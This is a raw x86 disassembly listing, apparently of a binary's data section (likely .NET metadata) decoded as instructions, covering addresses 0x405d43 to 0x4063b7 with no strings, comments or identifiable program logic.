  405d43:	00 a2 00 16 00 92    	add    %ah,-0x6dffea00(%edx)
  405d49:	09 12                	or     %edx,(%edx)
  405d4b:	00 16                	add    %dl,(%esi)
  405d4d:	00 85 04 12 00 16    	add    %al,0x16001204(%ebp)
  405d53:	00 c5                	add    %al,%ch
  405d55:	23 12                	and    (%edx),%edx
  405d57:	00 16                	add    %dl,(%esi)
  405d59:	00 87 01 12 00 16    	add    %al,0x16001201(%edi)
  405d5f:	00 1d 24 12 00 16    	add    %bl,0x16001224
  405d65:	00 b0 08 12 00 16    	add    %dh,0x16001208(%eax)
  405d6b:	00 c0                	add    %al,%al
  405d6d:	07                   	pop    %es
  405d6e:	12 00                	adc    (%eax),%al
  405d70:	16                   	push   %ss
  405d71:	00 a3 14 12 00 16    	add    %ah,0x16001214(%ebx)
  405d77:	00 5c 04 12          	add    %bl,0x12(%esp,%eax,1)
  405d7b:	00 16                	add    %dl,(%esi)
  405d7d:	00 8b 23 12 00 16    	add    %cl,0x16001223(%ebx)
  405d83:	00 54 03 15          	add    %dl,0x15(%ebx,%eax,1)
  405d87:	00 16                	add    %dl,(%esi)
  405d89:	00 34 06             	add    %dh,(%esi,%eax,1)
  405d8c:	12 00                	adc    (%eax),%al
  405d8e:	16                   	push   %ss
  405d8f:	00 a8 00 19 00 16    	add    %ch,0x16001900(%eax)
  405d95:	00 26                	add    %ah,(%esi)
  405d97:	23 12                	and    (%edx),%edx
  405d99:	00 16                	add    %dl,(%esi)
  405d9b:	00 cd                	add    %cl,%ch
  405d9d:	01 12                	add    %edx,(%edx)
  405d9f:	00 16                	add    %dl,(%esi)
  405da1:	00 bb 08 12 00 16    	add    %bh,0x16001208(%ebx)
  405da7:	00 13                	add    %dl,(%ebx)
  405da9:	26 12 00             	adc    %es:(%eax),%al
  405dac:	11 00                	adc    %eax,(%eax)
  405dae:	f6 0c 21 00          	testb  $0x0,(%ecx,%eiz,1)
  405db2:	11 00                	adc    %eax,(%eax)
  405db4:	db 0c 25 00 11 00 ab 	fisttpl -0x54ffef00(,%eiz,1)
  405dbb:	0c 29                	or     $0x29,%al
  405dbd:	00 11                	add    %dl,(%ecx)
  405dbf:	00 5f 0c             	add    %bl,0xc(%edi)
  405dc2:	2d 00 11 00 c3       	sub    $0xc3001100,%eax
  405dc7:	0c 2d                	or     $0x2d,%al
  405dc9:	00 11                	add    %dl,(%ecx)
  405dcb:	00 44 0c 30          	add    %al,0x30(%esp,%ecx,1)
  405dcf:	00 11                	add    %dl,(%ecx)
  405dd1:	00 27                	add    %ah,(%edi)
  405dd3:	0c 34                	or     $0x34,%al
  405dd5:	00 31                	add    %dh,(%ecx)
  405dd7:	00 0d 0c 37 00 11    	add    %cl,0x1100370c
  405ddd:	00 7b 0c             	add    %bh,0xc(%ebx)
  405de0:	30 00                	xor    %al,(%eax)
  405de2:	11 00                	adc    %eax,(%eax)
  405de4:	91                   	xchg   %eax,%ecx
  405de5:	0c 3a                	or     $0x3a,%al
  405de7:	00 11                	add    %dl,(%ecx)
  405de9:	00 d9                	add    %bl,%cl
  405deb:	22 c3                	and    %bl,%al
  405ded:	00 01                	add    %al,(%ecx)
  405def:	00 02                	add    %al,(%edx)
  405df1:	03 f2                	add    %edx,%esi
  405df3:	00 01                	add    %al,(%ecx)
  405df5:	00 63 18             	add    %ah,0x18(%ebx)
  405df8:	3a 00                	cmp    (%eax),%al
  405dfa:	01 00                	add    %eax,(%eax)
  405dfc:	02 03                	add    (%ebx),%al
  405dfe:	f2 00 01             	repnz add %al,(%ecx)
  405e01:	00 0f                	add    %cl,(%edi)
  405e03:	01 10                	add    %edx,(%eax)
  405e05:	01 01                	add    %eax,(%ecx)
  405e07:	00 1a                	add    %bl,(%edx)
  405e09:	16                   	push   %ss
  405e0a:	12 00                	adc    (%eax),%al
  405e0c:	01 00                	add    %eax,(%eax)
  405e0e:	ba 02 12 00 01       	mov    $0x1001202,%edx
  405e13:	00 84 24 37 00 01 00 	add    %al,0x10037(%esp)
  405e1a:	9f                   	lahf
  405e1b:	03 4b 01             	add    0x1(%ebx),%ecx
  405e1e:	01 00                	add    %eax,(%eax)
  405e20:	43                   	inc    %ebx
  405e21:	04 10                	add    $0x10,%al
  405e23:	01 01                	add    %eax,(%ecx)
  405e25:	00 02                	add    %al,(%edx)
  405e27:	03 f2                	add    %edx,%esi
  405e29:	00 01                	add    %al,(%ecx)
  405e2b:	00 e8                	add    %ch,%al
  405e2d:	00 4f 01             	add    %cl,0x1(%edi)
  405e30:	06                   	push   %es
  405e31:	06                   	push   %es
  405e32:	4e                   	dec    %esi
  405e33:	0a 3a                	or     (%edx),%bh
  405e35:	00 56 80             	add    %dl,-0x80(%esi)
  405e38:	18 23                	sbb    %ah,(%ebx)
  405e3a:	4b                   	dec    %ebx
  405e3b:	01 56 80             	add    %edx,-0x80(%esi)
  405e3e:	ba 19 4b 01 56       	mov    $0x56014b19,%edx
  405e43:	80 e7 22             	and    $0x22,%bh
  405e46:	4b                   	dec    %ebx
  405e47:	01 56 80             	add    %edx,-0x80(%esi)
  405e4a:	6a 04                	push   $0x4
  405e4c:	4b                   	dec    %ebx
  405e4d:	01 56 80             	add    %edx,-0x80(%esi)
  405e50:	66 13 4b 01          	adc    0x1(%ebx),%cx
  405e54:	56                   	push   %esi
  405e55:	80 d0 03             	adc    $0x3,%al
  405e58:	4b                   	dec    %ebx
  405e59:	01 56 80             	add    %edx,-0x80(%esi)
  405e5c:	26 05 4b 01 56 80    	es add $0x8056014b,%eax
  405e62:	54                   	push   %esp
  405e63:	16                   	push   %ss
  405e64:	4b                   	dec    %ebx
  405e65:	01 56 80             	add    %edx,-0x80(%esi)
  405e68:	c0 00 4b             	rolb   $0x4b,(%eax)
  405e6b:	01 56 80             	add    %edx,-0x80(%esi)
  405e6e:	5d                   	pop    %ebp
  405e6f:	1b 4b 01             	sbb    0x1(%ebx),%ecx
  405e72:	56                   	push   %esi
  405e73:	80 10 03             	adcb   $0x3,(%eax)
  405e76:	4b                   	dec    %ebx
  405e77:	01 56 80             	add    %edx,-0x80(%esi)
  405e7a:	85 08                	test   %ecx,(%eax)
  405e7c:	4b                   	dec    %ebx
  405e7d:	01 06                	add    %eax,(%esi)
  405e7f:	06                   	push   %es
  405e80:	4e                   	dec    %esi
  405e81:	0a 87 02 56 80 62    	or     0x62805602(%edi),%al
  405e87:	01 8a 02 56 80 39    	add    %ecx,0x39805602(%edx)
  405e8d:	18 8a 02 56 80 8a    	sbb    %cl,-0x757fa9fe(%edx)
  405e93:	1d 8a 02 16 00       	sbb    $0x16028a,%eax
  405e98:	9c                   	pushf
  405e99:	00 93 02 31 00 24    	add    %dl,0x24003102(%ebx)
  405e9f:	15 12 00 16 00       	adc    $0x160012,%eax
  405ea4:	65 0a f2             	gs or  %dl,%dh
  405ea7:	00 16                	add    %dl,(%esi)
  405ea9:	00 20                	add    %ah,(%eax)
  405eab:	1b b6 02 51 80 4f    	sbb    0x4f805102(%esi),%esi
  405eb1:	09 3a                	or     %edi,(%edx)
  405eb3:	00 51 80             	add    %dl,-0x80(%ecx)
  405eb6:	82 07 3a             	addb   $0x3a,(%edi)
  405eb9:	00 51 80             	add    %dl,-0x80(%ecx)
  405ebc:	63 03                	arpl   %eax,(%ebx)
  405ebe:	3a 00                	cmp    (%eax),%al
  405ec0:	51                   	push   %ecx
  405ec1:	80 67 23 3a          	andb   $0x3a,0x23(%edi)
  405ec5:	00 21                	add    %ah,(%ecx)
  405ec7:	00 f3                	add    %dh,%bl
  405ec9:	19 29                	sbb    %ebp,(%ecx)
  405ecb:	00 21                	add    %ah,(%ecx)
  405ecd:	00 19                	add    %bl,(%ecx)
  405ecf:	07                   	pop    %es
  405ed0:	29 00                	sub    %eax,(%eax)
  405ed2:	31 00                	xor    %eax,(%eax)
  405ed4:	70 03                	jo     0x405ed9
  405ed6:	29 00                	sub    %eax,(%eax)
  405ed8:	33 01                	xor    (%ecx),%eax
  405eda:	45                   	inc    %ebp
  405edb:	18 f2                	sbb    %dh,%dl
  405edd:	02 33                	add    (%ebx),%dh
  405edf:	01 b5 0a f6 02 20    	add    %esi,0x2002f60a(%ebp)
  405ee5:	26 00 00             	add    %al,%es:(%eax)
  405ee8:	00 00                	add    %al,(%eax)
  405eea:	96                   	xchg   %eax,%esi
  405eeb:	00 8c 18 0a 00 01 00 	add    %cl,0x1000a(%eax,%ebx,1)
  405ef2:	78 20                	js     0x405f14
  405ef4:	00 00                	add    %al,(%eax)
  405ef6:	00 00                	add    %al,(%eax)
  405ef8:	86 18                	xchg   %bl,(%eax)
  405efa:	37                   	aaa
  405efb:	1d 0e 00 01 00       	sbb    $0x1000e,%eax
  405f00:	f4                   	hlt
  405f01:	26 00 00             	add    %al,%es:(%eax)
  405f04:	00 00                	add    %al,(%eax)
  405f06:	96                   	xchg   %eax,%esi
  405f07:	00 2e                	add    %ch,(%esi)
  405f09:	0b 1d 00 01 00 30    	or     0x30000100,%ebx
  405f0f:	28 00                	sub    %al,(%eax)
  405f11:	00 00                	add    %al,(%eax)
  405f13:	00 91 00 88 1b 1d    	add    %dl,0x1d1b8800(%ecx)
  405f19:	00 01                	add    %al,(%ecx)
  405f1b:	00 98 28 00 00 00    	add    %bl,0x28(%eax)
  405f21:	00 91 18 3d 1d 0a    	add    %dl,0xa1d3d18(%ecx)
  405f27:	00 01                	add    %al,(%ecx)
  405f29:	00 80 20 00 00 00    	add    %al,0x20(%eax)
  405f2f:	00 96 08 88 21 3d    	add    %dl,0x3d218808(%esi)
  405f35:	00 01                	add    %al,(%ecx)
  405f37:	00 87 20 00 00 00    	add    %al,0x20(%edi)
  405f3d:	00 96 08 96 21 42    	add    %dl,0x42219608(%esi)
  405f43:	00 01                	add    %al,(%ecx)
  405f45:	00 8f 20 00 00 00    	add    %cl,0x20(%edi)
  405f4b:	00 96 08 6c 21 48    	add    %dl,0x48216c08(%esi)
  405f51:	00 02                	add    %al,(%edx)
  405f53:	00 96 20 00 00 00    	add    %dl,0x20(%esi)
  405f59:	00 96 08 7a 21 4d    	add    %dl,0x4d217a08(%esi)
  405f5f:	00 02                	add    %al,(%edx)
  405f61:	00 9e 20 00 00 00    	add    %bl,0x20(%esi)
  405f67:	00 91 08 27 1c 53    	add    %dl,0x531c2708(%ecx)
  405f6d:	00 03                	add    %al,(%ebx)
  405f6f:	00 a5 20 00 00 00    	add    %ah,0x20(%ebp)
  405f75:	00 91 08 32 1c 58    	add    %dl,0x581c3208(%ecx)
  405f7b:	00 03                	add    %al,(%ebx)
  405f7d:	00 ad 20 00 00 00    	add    %ch,0x20(%ebp)
  405f83:	00 91 08 70 12 5e    	add    %dl,0x5e127008(%ecx)
  405f89:	00 04 00             	add    %al,(%eax,%eax,1)
  405f8c:	b4 20                	mov    $0x20,%ah
  405f8e:	00 00                	add    %al,(%eax)
  405f90:	00 00                	add    %al,(%eax)
  405f92:	91                   	xchg   %eax,%ecx
  405f93:	08 7f 12             	or     %bh,0x12(%edi)
  405f96:	62 00                	bound  %eax,(%eax)
  405f98:	04 00                	add    $0x0,%al
  405f9a:	bc 20 00 00 00       	mov    $0x20,%esp
  405f9f:	00 91 08 13 21 5e    	add    %dl,0x5e211308(%ecx)
  405fa5:	00 05 00 c3 20 00    	add    %al,0x20c300
  405fab:	00 00                	add    %al,(%eax)
  405fad:	00 91 08 1e 21 62    	add    %dl,0x62211e08(%ecx)
  405fb3:	00 05 00 cb 20 00    	add    %al,0x20cb00
  405fb9:	00 00                	add    %al,(%eax)
  405fbb:	00 91 08 31 12 67    	add    %dl,0x67123108(%ecx)
  405fc1:	00 06                	add    %al,(%esi)
  405fc3:	00 d2                	add    %dl,%dl
  405fc5:	20 00                	and    %al,(%eax)
  405fc7:	00 00                	add    %al,(%eax)
  405fc9:	00 91 08 3f 12 6c    	add    %dl,0x6c123f08(%ecx)
  405fcf:	00 06                	add    %al,(%esi)
  405fd1:	00 da                	add    %bl,%dl
  405fd3:	20 00                	and    %al,(%eax)
  405fd5:	00 00                	add    %al,(%eax)
  405fd7:	00 96 08 e4 0b 1d    	add    %dl,0x1d0be408(%esi)
  405fdd:	00 07                	add    %al,(%edi)
  405fdf:	00 e1                	add    %ah,%cl
  405fe1:	20 00                	and    %al,(%eax)
  405fe3:	00 00                	add    %al,(%eax)
  405fe5:	00 96 08 f4 0b 72    	add    %dl,0x720bf408(%esi)
  405feb:	00 07                	add    %al,(%edi)
  405fed:	00 e9                	add    %ch,%cl
  405fef:	20 00                	and    %al,(%eax)
  405ff1:	00 00                	add    %al,(%eax)
  405ff3:	00 91 08 3b 0b 77    	add    %dl,0x770b3b08(%ecx)
  405ff9:	00 08                	add    %cl,(%eax)
  405ffb:	00 f0                	add    %dh,%al
  405ffd:	20 00                	and    %al,(%eax)
  405fff:	00 00                	add    %al,(%eax)
  406001:	00 91 08 73 13 67    	add    %dl,0x67137308(%ecx)
  406007:	00 08                	add    %cl,(%eax)
  406009:	00 f7                	add    %dh,%bh
  40600b:	20 00                	and    %al,(%eax)
  40600d:	00 00                	add    %al,(%eax)
  40600f:	00 91 08 7c 13 6c    	add    %dl,0x6c137c08(%ecx)
  406015:	00 08                	add    %cl,(%eax)
  406017:	00 ff                	add    %bh,%bh
  406019:	20 00                	and    %al,(%eax)
  40601b:	00 00                	add    %al,(%eax)
  40601d:	00 96 08 e3 16 7b    	add    %dl,0x7b16e308(%esi)
  406023:	00 09                	add    %cl,(%ecx)
  406025:	00 06                	add    %al,(%esi)
  406027:	21 00                	and    %eax,(%eax)
  406029:	00 00                	add    %al,(%eax)
  40602b:	00 96 08 f0 16 7f    	add    %dl,0x7f16f008(%esi)
  406031:	00 09                	add    %cl,(%ecx)
  406033:	00 3c 29             	add    %bh,(%ecx,%ebp,1)
  406036:	00 00                	add    %al,(%eax)
  406038:	00 00                	add    %al,(%eax)
  40603a:	96                   	xchg   %eax,%esi
  40603b:	00 6a 06             	add    %ch,0x6(%edx)
  40603e:	0a 00                	or     (%eax),%al
  406040:	0a 00                	or     (%eax),%al
  406042:	0e                   	push   %cs
  406043:	21 00                	and    %eax,(%eax)
  406045:	00 00                	add    %al,(%eax)
  406047:	00 91 00 33 07 84    	add    %dl,-0x7bf8cd00(%ecx)
  40604d:	00 0a                	add    %cl,(%edx)
  40604f:	00 19                	add    %bl,(%ecx)
  406051:	21 00                	and    %eax,(%eax)
  406053:	00 00                	add    %al,(%eax)
  406055:	00 91 00 d4 1a 89    	add    %dl,-0x76e52c00(%ecx)
  40605b:	00 0b                	add    %cl,(%ebx)
  40605d:	00 34 2c             	add    %dh,(%esp,%ebp,1)
  406060:	00 00                	add    %al,(%eax)
  406062:	00 00                	add    %al,(%eax)
  406064:	96                   	xchg   %eax,%esi
  406065:	00 de                	add    %bl,%dh
  406067:	03 0a                	add    (%edx),%ecx
  406069:	00 0f                	add    %cl,(%edi)
  40606b:	00 98 2c 00 00 00    	add    %bl,0x2c(%eax)
  406071:	00 96 00 e1 19 94    	add    %dl,-0x6be61f00(%esi)
  406077:	00 0f                	add    %cl,(%edi)
  406079:	00 58 2e             	add    %bl,0x2e(%eax)
  40607c:	00 00                	add    %al,(%eax)
  40607e:	00 00                	add    %al,(%eax)
  406080:	96                   	xchg   %eax,%esi
  406081:	00 97 23 58 00 10    	add    %dl,0x10005823(%edi)
  406087:	00 74 2f 00          	add    %dh,0x0(%edi,%ebp,1)
  40608b:	00 00                	add    %al,(%eax)
  40608d:	00 96 00 cc 06 9a    	add    %dl,-0x65f93400(%esi)
  406093:	00 11                	add    %dl,(%ecx)
  406095:	00 26                	add    %ah,(%esi)
  406097:	21 00                	and    %eax,(%eax)
  406099:	00 00                	add    %al,(%eax)
  40609b:	00 91 00 c5 03 9a    	add    %dl,-0x65fc3b00(%ecx)
  4060a1:	00 12                	add    %dl,(%edx)
  4060a3:	00 34 21             	add    %dh,(%ecx,%eiz,1)
  4060a6:	00 00                	add    %al,(%eax)
  4060a8:	00 00                	add    %al,(%eax)
  4060aa:	91                   	xchg   %eax,%ecx
  4060ab:	18 3d 1d 0a 00 13    	sbb    %bh,0x13000a1d
  4060b1:	00 40 21             	add    %al,0x21(%eax)
  4060b4:	00 00                	add    %al,(%eax)
  4060b6:	00 00                	add    %al,(%eax)
  4060b8:	96                   	xchg   %eax,%esi
  4060b9:	00 29                	add    %ch,(%ecx)
  4060bb:	18 c7                	sbb    %al,%bh
  4060bd:	00 13                	add    %dl,(%ebx)
  4060bf:	00 4d 21             	add    %cl,0x21(%ebp)
  4060c2:	00 00                	add    %al,(%eax)
  4060c4:	00 00                	add    %al,(%eax)
  4060c6:	96                   	xchg   %eax,%esi
  4060c7:	00 b4 00 cd 00 14 00 	add    %dh,0x1400cd(%eax,%eax,1)
  4060ce:	08 30                	or     %dh,(%eax)
  4060d0:	00 00                	add    %al,(%eax)
  4060d2:	00 00                	add    %al,(%eax)
  4060d4:	96                   	xchg   %eax,%esi
  4060d5:	00 40 26             	add    %al,0x26(%eax)
  4060d8:	cd 00                	int    $0x0
  4060da:	15 00 4c 30 00       	adc    $0x304c00,%eax
  4060df:	00 00                	add    %al,(%eax)
  4060e1:	00 96 00 c6 02 cd    	add    %dl,-0x32fd3a00(%esi)
  4060e7:	00 16                	add    %dl,(%esi)
  4060e9:	00 90 30 00 00 00    	add    %dl,0x30(%eax)
  4060ef:	00 96 00 37 0d d3    	add    %dl,-0x2cf2c900(%esi)
  4060f5:	00 17                	add    %dl,(%edi)
  4060f7:	00 5a 21             	add    %bl,0x21(%edx)
  4060fa:	00 00                	add    %al,(%eax)
  4060fc:	00 00                	add    %al,(%eax)
  4060fe:	96                   	xchg   %eax,%esi
  4060ff:	00 ed                	add    %ch,%ch
  406101:	04 da                	add    $0xda,%al
  406103:	00 18                	add    %bl,(%eax)
  406105:	00 67 21             	add    %ah,0x21(%edi)
  406108:	00 00                	add    %al,(%eax)
  40610a:	00 00                	add    %al,(%eax)
  40610c:	96                   	xchg   %eax,%esi
  40610d:	00 fc                	add    %bh,%ah
  40610f:	09 e0                	or     %esp,%eax
  406111:	00 19                	add    %bl,(%ecx)
  406113:	00 8b 21 00 00 00    	add    %cl,0x21(%ebx)
  406119:	00 96 00 9a 05 e6    	add    %dl,-0x19fa6600(%esi)
  40611f:	00 1a                	add    %bl,(%edx)
  406121:	00 9f 21 00 00 00    	add    %bl,0x21(%edi)
  406127:	00 96 00 f2 25 ec    	add    %dl,-0x13da0e00(%esi)
  40612d:	00 1b                	add    %bl,(%ebx)
  40612f:	00 78 20             	add    %bh,0x20(%eax)
  406132:	00 00                	add    %al,(%eax)
  406134:	00 00                	add    %al,(%eax)
  406136:	86 18                	xchg   %bl,(%eax)
  406138:	37                   	aaa
  406139:	1d 0e 00 1c 00       	sbb    $0x1c000e,%eax
  40613e:	ac                   	lods   %ds:(%esi),%al
  40613f:	21 00                	and    %eax,(%eax)
  406141:	00 00                	add    %al,(%eax)
  406143:	00 91 18 3d 1d 0a    	add    %dl,0xa1d3d18(%ecx)
  406149:	00 1c 00             	add    %bl,(%eax,%eax,1)
  40614c:	b8 21 00 00 00       	mov    $0x21,%eax
  406151:	00 86 18 37 1d fa    	add    %al,-0x5e2c8e8(%esi)
  406157:	00 1c 00             	add    %bl,(%eax,%eax,1)
  40615a:	ce                   	into
  40615b:	21 00                	and    %eax,(%eax)
  40615d:	00 00                	add    %al,(%eax)
  40615f:	00 e1                	add    %ah,%cl
  406161:	09 d7                	or     %edx,%edi
  406163:	21 04 01             	and    %eax,(%ecx,%eax,1)
  406166:	1d 00 e1 21 00       	sbb    $0x21e100,%eax
  40616b:	00 00                	add    %al,(%eax)
  40616d:	00 e1                	add    %ah,%cl
  40616f:	01 9a 22 08 01 1d    	add    %ebx,0x1d010822(%edx)
  406175:	00 04 22             	add    %al,(%edx,%eiz,1)
  406178:	00 00                	add    %al,(%eax)
  40617a:	00 00                	add    %al,(%eax)
  40617c:	e1 01                	loope  0x40617f
  40617e:	ee                   	out    %al,(%dx)
  40617f:	20 0e                	and    %cl,(%esi)
  406181:	00 1d 00 0d 22 00    	add    %bl,0x220d00
  406187:	00 00                	add    %al,(%eax)
  406189:	00 86 18 37 1d 14    	add    %al,0x141d3718(%esi)
  40618f:	01 1d 00 23 22 00    	add    %ebx,0x222300
  406195:	00 00                	add    %al,(%eax)
  406197:	00 86 00 09 0a 20    	add    %al,0x200a0900(%esi)
  40619d:	01 1f                	add    %ebx,(%edi)
  40619f:	00 30                	add    %dh,(%eax)
  4061a1:	22 00                	and    (%eax),%al
  4061a3:	00 00                	add    %al,(%eax)
  4061a5:	00 86 00 b9 03 25    	add    %al,0x2503b900(%esi)
  4061ab:	01 1f                	add    %ebx,(%edi)
  4061ad:	00 44 22 00          	add    %al,0x0(%edx,%eiz,1)
  4061b1:	00 00                	add    %al,(%eax)
  4061b3:	00 86 00 a3 06 2b    	add    %al,0x2b06a300(%esi)
  4061b9:	01 20                	add    %esp,(%eax)
  4061bb:	00 58 22             	add    %bl,0x22(%eax)
  4061be:	00 00                	add    %al,(%eax)
  4061c0:	00 00                	add    %al,(%eax)
  4061c2:	86 00                	xchg   %al,(%eax)
  4061c4:	93                   	xchg   %eax,%ebx
  4061c5:	15 31 01 21 00       	adc    $0x210131,%eax
  4061ca:	6c                   	insb   (%dx),%es:(%edi)
  4061cb:	22 00                	and    (%eax),%al
  4061cd:	00 00                	add    %al,(%eax)
  4061cf:	00 86 08 85 17 37    	add    %al,0x37178508(%esi)
  4061d5:	01 22                	add    %esp,(%edx)
  4061d7:	00 7a 22             	add    %bh,0x22(%edx)
  4061da:	00 00                	add    %al,(%eax)
  4061dc:	00 00                	add    %al,(%eax)
  4061de:	86 08                	xchg   %cl,(%eax)
  4061e0:	0b 15 3d 01 23 00    	or     0x23013d,%edx
  4061e6:	87 22                	xchg   %esp,(%edx)
  4061e8:	00 00                	add    %al,(%eax)
  4061ea:	00 00                	add    %al,(%eax)
  4061ec:	81 00 65 20 53 01    	addl   $0x1532065,(%eax)
  4061f2:	23 00                	and    (%eax),%eax
  4061f4:	c8 30 00 00          	enter  $0x30,$0x0
  4061f8:	00 00                	add    %al,(%eax)
  4061fa:	81 00 01 01 0e 00    	addl   $0xe0101,(%eax)
  406200:	24 00                	and    $0x0,%al
  406202:	08 31                	or     %dh,(%ecx)
  406204:	00 00                	add    %al,(%eax)
  406206:	00 00                	add    %al,(%eax)
  406208:	81 00 51 08 20 01    	addl   $0x1200851,(%eax)
  40620e:	24 00                	and    $0x0,%al
  406210:	30 31                	xor    %dh,(%ecx)
  406212:	00 00                	add    %al,(%eax)
  406214:	00 00                	add    %al,(%eax)
  406216:	81 00 a4 08 58 01    	addl   $0x15808a4,(%eax)
  40621c:	24 00                	and    $0x0,%al
  40621e:	a0 31 00 00 00       	mov    0x31,%al
  406223:	00 86 00 1d 03 25    	add    %al,0x25031d00(%esi)
  406229:	01 25 00 a1 22 00    	add    %esp,0x22a100
  40622f:	00 00                	add    %al,(%eax)
  406231:	00 81 00 cf 05 20    	add    %al,0x2005cf00(%ecx)
  406237:	01 26                	add    %esp,(%esi)
  406239:	00 bf 22 00 00 00    	add    %bh,0x22(%edi)
  40623f:	00 81 00 c0 14 20    	add    %al,0x2014c000(%ecx)
  406245:	01 26                	add    %esp,(%esi)
  406247:	00 dd                	add    %bl,%ch
  406249:	22 00                	and    (%eax),%al
  40624b:	00 00                	add    %al,(%eax)
  40624d:	00 86 00 26 06 20    	add    %al,0x20062600(%esi)
  406253:	01 26                	add    %esp,(%esi)
  406255:	00 c8                	add    %cl,%al
  406257:	31 00                	xor    %eax,(%eax)
  406259:	00 00                	add    %al,(%eax)
  40625b:	00 81 00 72 1a 5d    	add    %al,0x5d1a7200(%ecx)
  406261:	01 26                	add    %esp,(%esi)
  406263:	00 84 32 00 00 00 00 	add    %al,0x0(%edx,%esi,1)
  40626a:	81 00 53 18 5d 01    	addl   $0x15d1853,(%eax)
  406270:	27                   	daa
  406271:	00 e5                	add    %ah,%ch
  406273:	22 00                	and    (%eax),%al
  406275:	00 00                	add    %al,(%eax)
  406277:	00 86 00 e3 1a 63    	add    %al,0x631ae300(%esi)
  40627d:	01 28                	add    %ebp,(%eax)
  40627f:	00 fa                	add    %bh,%dl
  406281:	22 00                	and    (%eax),%al
  406283:	00 00                	add    %al,(%eax)
  406285:	00 86 00 5a 23 68    	add    %al,0x68235a00(%esi)
  40628b:	01 29                	add    %ebp,(%ecx)
  40628d:	00 28                	add    %ch,(%eax)
  40628f:	33 00                	xor    (%eax),%eax
  406291:	00 00                	add    %al,(%eax)
  406293:	00 86 00 43 15 6d    	add    %al,0x6d154300(%esi)
  406299:	01 2a                	add    %ebp,(%edx)
  40629b:	00 cc                	add    %cl,%ah
  40629d:	33 00                	xor    (%eax),%eax
  40629f:	00 00                	add    %al,(%eax)
  4062a1:	00 86 00 ee 12 71    	add    %al,0x7112ee00(%esi)
  4062a7:	01 2a                	add    %ebp,(%edx)
  4062a9:	00 70 34             	add    %dh,0x34(%eax)
  4062ac:	00 00                	add    %al,(%eax)
  4062ae:	00 00                	add    %al,(%eax)
  4062b0:	86 00                	xchg   %al,(%eax)
  4062b2:	52                   	push   %edx
  4062b3:	01 75 01             	add    %esi,0x1(%ebp)
  4062b6:	2a 00                	sub    (%eax),%al
  4062b8:	0f 23 00             	mov    %eax,%db0
  4062bb:	00 00                	add    %al,(%eax)
  4062bd:	00 86 00 7a 15 79    	add    %al,0x79157a00(%esi)
  4062c3:	01 2a                	add    %ebp,(%edx)
  4062c5:	00 00                	add    %al,(%eax)
  4062c7:	35 00 00 00 00       	xor    $0x0,%eax
  4062cc:	86 00                	xchg   %al,(%eax)
  4062ce:	10 04 7f             	adc    %al,(%edi,%edi,2)
  4062d1:	01 2b                	add    %ebp,(%ebx)
  4062d3:	00 20                	add    %ah,(%eax)
  4062d5:	23 00                	and    (%eax),%eax
  4062d7:	00 00                	add    %al,(%eax)
  4062d9:	00 86 00 2a 0d 84    	add    %al,-0x7bf2d600(%esi)
  4062df:	01 2b                	add    %ebp,(%ebx)
  4062e1:	00 35 23 00 00 00    	add    %dh,0x23
  4062e7:	00 86 00 77 06 8a    	add    %al,-0x75f98900(%esi)
  4062ed:	01 2d 00 b0 35 00    	add    %ebp,0x35b000
  4062f3:	00 00                	add    %al,(%eax)
  4062f5:	00 86 00 39 08 90    	add    %al,-0x6ff7c700(%esi)
  4062fb:	01 2f                	add    %ebp,(%edi)
  4062fd:	00 4b 23             	add    %cl,0x23(%ebx)
  406300:	00 00                	add    %al,(%eax)
  406302:	00 00                	add    %al,(%eax)
  406304:	86 00                	xchg   %al,(%eax)
  406306:	dd 01                	fldl   (%ecx)
  406308:	90                   	nop
  406309:	01 30                	add    %esi,(%eax)
  40630b:	00 04 36             	add    %al,(%esi,%esi,1)
  40630e:	00 00                	add    %al,(%eax)
  406310:	00 00                	add    %al,(%eax)
  406312:	86 00                	xchg   %al,(%eax)
  406314:	f0 1a 25 01 31 00 89 	lock sbb 0x89003101,%ah
  40631b:	23 00                	and    (%eax),%eax
  40631d:	00 00                	add    %al,(%eax)
  40631f:	00 86 00 12 08 0e    	add    %al,0xe081200(%esi)
  406325:	00 32                	add    %dh,(%edx)
  406327:	00 9f 23 00 00 00    	add    %bl,0x23(%edi)
  40632d:	00 86 00 16 15 53    	add    %al,0x53151600(%esi)
  406333:	01 32                	add    %esi,(%edx)
  406335:	00 af 23 00 00 00    	add    %ch,0x23(%edi)
  40633b:	00 86 00 e8 06 95    	add    %al,-0x6af91800(%esi)
  406341:	01 33                	add    %esi,(%ebx)
  406343:	00 ca                	add    %cl,%dl
  406345:	23 00                	and    (%eax),%eax
  406347:	00 00                	add    %al,(%eax)
  406349:	00 86 00 e1 04 99    	add    %al,-0x66fb1f00(%esi)
  40634f:	01 33                	add    %esi,(%ebx)
  406351:	00 df                	add    %bl,%bh
  406353:	23 00                	and    (%eax),%eax
  406355:	00 00                	add    %al,(%eax)
  406357:	00 86 00 ff 08 9e    	add    %al,-0x61f70100(%esi)
  40635d:	01 34 00             	add    %esi,(%eax,%eax,1)
  406360:	f5                   	cmc
  406361:	23 00                	and    (%eax),%eax
  406363:	00 00                	add    %al,(%eax)
  406365:	00 86 00 00 23 a3    	add    %al,-0x5cdd0000(%esi)
  40636b:	01 35 00 a8 36 00    	add    %esi,0x36a800
  406371:	00 00                	add    %al,(%eax)
  406373:	00 86 00 2d 08 79    	add    %al,0x79082d00(%esi)
  406379:	01 36                	add    %esi,(%esi)
  40637b:	00 fc                	add    %bh,%ah
  40637d:	36 00 00             	add    %al,%ss:(%eax)
  406380:	00 00                	add    %al,(%eax)
  406382:	86 00                	xchg   %al,(%eax)
  406384:	91                   	xchg   %eax,%ecx
  406385:	07                   	pop    %es
  406386:	53                   	push   %ebx
  406387:	01 37                	add    %esi,(%edi)
  406389:	00 20                	add    %ah,(%eax)
  40638b:	37                   	aaa
  40638c:	00 00                	add    %al,(%eax)
  40638e:	00 00                	add    %al,(%eax)
  406390:	86 00                	xchg   %al,(%eax)
  406392:	d2 23                	shlb   %cl,(%ebx)
  406394:	5d                   	pop    %ebp
  406395:	01 38                	add    %edi,(%eax)
  406397:	00 b0 3c 00 00 00    	add    %dh,0x3c(%eax)
  40639d:	00 86 00 50 15 7f    	add    %al,0x7f155000(%esi)
  4063a3:	01 39                	add    %edi,(%ecx)
  4063a5:	00 14 3d 00 00 00 00 	add    %dl,0x0(,%edi,1)
  4063ac:	86 00                	xchg   %al,(%eax)
  4063ae:	da 06                	fiaddl (%esi)
  4063b0:	5d                   	pop    %ebp
  4063b1:	01 39                	add    %edi,(%ecx)
  4063b3:	00 0a                	add    %cl,(%edx)
  4063b5:	24 00                	and    $0x0,%al
  4063b7:	00 00                	add    %al,(%eax)
